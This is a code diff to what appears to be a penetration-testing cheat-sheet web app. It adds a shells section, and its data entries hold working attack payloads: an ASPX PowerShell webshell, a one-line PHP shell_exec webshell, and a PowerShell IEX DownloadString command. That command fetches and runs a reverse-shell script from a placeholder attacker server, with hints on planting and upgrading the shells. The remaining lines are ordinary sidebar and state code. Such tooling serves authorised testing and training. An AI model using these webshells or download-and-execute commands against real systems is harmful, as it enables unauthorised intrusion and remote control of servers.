+        {p:'ASPX PowerShell webshell',c:'<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% \nvar cmd = Request.QueryString["cmd"];\nvar info = new ProcessStartInfo("powershell","-c "+cmd);\ninfo.RedirectStandardOutput=true;info.UseShellExecute=false;\nvar p = Process.Start(info);\nResponse.Write(p.StandardOutput.ReadToEnd());\n%>',h:'Executes PowerShell commands via web request. Use to trigger full PS reverse shell.'},
+        {p:'PHP webshell (Windows Apache)',c:'<?php echo shell_exec($_GET["cmd"]); ?>',h:'Drop as shell.php. Access: http://TARGETIP/shell.php?cmd=whoami — upgrade to reverse shell with PS one-liner.'},
+        {p:'Trigger PS reverse shell via webshell',c:'powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString(\'http://TARGETIP:TARGETPORT/shell.ps1\')"',h:'URL-encode and use as ?cmd= value. Fetches and executes PS reverse shell from your server.'},
+      ]},
+    ],
+  },
 };
 
 // ═══════════════════════════════════════════════════
@@ -2646,7 +2784,7 @@ const ENUM_DB = {
 //  STATE
 // ═══════════════════════════════════════════════════
 const STORAGE_KEY = 'reconflow_v3';
-const DEFAULT_STATE = {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,env:true},toolFavorites:{},customCmds:{},cmdLog:[],sessionName:'SESSION 1',targetVars:{port:'',domain:'',user:'',pass:'',hash:'',wordlist:''}};
+const DEFAULT_STATE = {ip:'',svcStatus:{},checks:{},notes:{},activeTool:{},session:[],collapsed:{},infoOpen:{},lang:'en',sectionOpen:{services:true,tools:true,shells:true,env:true},toolFavorites:{},customCmds:{},cmdLog:[],sessionName:'SESSION 1',targetVars:{port:'',domain:'',user:'',pass:'',hash:'',wordlist:''}};
 
 let state = loadState();
 let currentSvc = null;
@@ -2768,6 +2906,25 @@ function renderSidebar() {
 
   if (tlOpen) {
     TOOLS_ORDER.forEach(key => {
+      const tool = TOOLS_DB[key];
+      sb.insertAdjacentHTML('beforeend', `
+        <button class="tool-nav-btn${currentSvc===key?' active':''}" onclick="navigate('${key}')">
+          <span class="svc-label">${tool.label}</span>
+        </button>
+      `);
+    });
+  }
+
+  // SHELLS section
+  const shellsOpen = state.sectionOpen.shells !== false;
+  sb.insertAdjacentHTML('beforeend',`<hr class="sb-sep">
+    <div class="sb-section-hdr" onclick="toggleSection('shells')">
+      <span>SHELLS</span>
+      <span class="sb-section-arrow${shellsOpen?' open':''}">▶</span>
+    </div>`);
+
+  if (shellsOpen) {
+    ['revshell-lin','revshell-win'].forEach(key => {
       const tool = TOOLS_DB[key];
       sb.insertAdjacentHTML('beforeend', `
         <button class="tool-nav-btn${currentSvc===key?' active':''}" onclick="navigate('${key}')">
